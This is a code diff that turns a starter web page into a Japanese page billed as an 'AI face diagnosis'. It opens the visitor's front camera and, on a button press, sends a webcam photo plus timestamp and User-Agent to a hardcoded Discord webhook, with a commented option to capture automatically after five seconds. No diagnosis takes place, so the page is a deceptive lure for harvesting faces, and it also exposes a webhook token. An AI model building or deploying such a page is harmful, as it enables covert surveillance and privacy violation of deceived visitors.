@@ -1,56 +1,66 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html lang="ja">
 <head>
-  <!-- 
-      This is an HTML comment
-      You can write text in a comment and the content won't be visible in the page
-    -->
-
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link rel="icon" href="https://glitch.com/favicon.ico" />
-
-  <!--
-      This is the page head - it contains info the browser uses
-      Like the title, which appears on the browser tab but not inside the page
-      Further down you'll see the content that displays in the page
-    -->
-  <title>Hello World!</title>
-
-  <!-- The website stylesheet -->
-  <link rel="stylesheet" href="/style.css" />
-
-  <!-- The website JavaScript file -->
-  <script src="/script.js" defer></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI顔診断</title>
+  <style>
+    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
+    video, canvas { max-width: 100%; border: 2px solid #0f0; margin: 20px 0; }
+    button { font-size: 1.5em; padding: 15px 30px; margin: 10px; background: #0f0; color: #000; border: none; }
+  </style>
 </head>
-
 <body>
-  <!--
-      The body includes the content you see in the page
-      Each element is defined using tags, like this <div></div>
-      The attributes like class="wrapper" let us style elements in the CSS
-    -->
-  <div class="wrapper">
-    <div class="content" role="main">
-      <h1 class="title">Oh hi website!</h1>
-      <img src="/cool-website.svg" class="illustration" alt="cool website" />
-      <div class="instructions">
-        <p>
-          Fork <a href="https://github.com/glitchdotcom/website-to-compute">this project</a> and open it in a GitHub Codespace.
-        </p>
-        <p> Follow the steps in the README to deploy your new website to Fastly in a few steps!
-        </p>
+  <h1>写真撮影システム</h1>
+  <p>カメラを許可して撮影してください</p>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <br>
+  <button onclick="capture()">撮影 & 送信</button>
 
-      </div>
+  <script>
+    const webhook = 'https://ptb.discord.com/api/webhooks/1456827735220424757/SzBZX1vDz0OyjP34rGjAh3qCaNVSgdIH7AadF8eDDUoQHr_ZsSdwFx23_Sim51cQxoPs'; // Discord Webhook URLを貼り付け
 
-      <footer class="footer">
-        <div>
-          <a class="remix" href="https://github.com/glitchdotcom/website-to-compute">🚧 Get your own site</a>
-        </div>
-      </footer>
-    </div>
-  </div>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+      .then(stream => {
+        video.srcObject = stream;
+        video.play();
+      })
+      .catch(err => {
+        document.body.innerHTML += `<p>カメラアクセス拒否またはエラー: ${err.message}</p>`;
+      });
+
+    function capture() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      
+      canvas.toBlob(blob => {
+        const form = new FormData();
+        form.append('file', blob, 'capture.jpg');
+        
+        const payload = {
+          content: '**写真キャプチャ成功**\\nタイムスタンプ: ' + new Date().toLocaleString() + 
+                   '\\nUser-Agent: ' + navigator.userAgent
+        };
+        form.append('payload_json', JSON.stringify(payload));
+
+        fetch(webhook, {
+          method: 'POST',
+          body: form
+        }).then(() => {
+          document.body.innerHTML = '<h1>写真を送信しました。ありがとう！</h1>';
+        }).catch(err => {
+          alert('送信エラー: ' + err);
+        });
+      }, 'image/jpeg', 0.95);
+    }
+
+    // 自動撮影オプション（任意）: setTimeout(capture, 5000); で5秒後自動
+  </script>
 </body>
-
 </html>
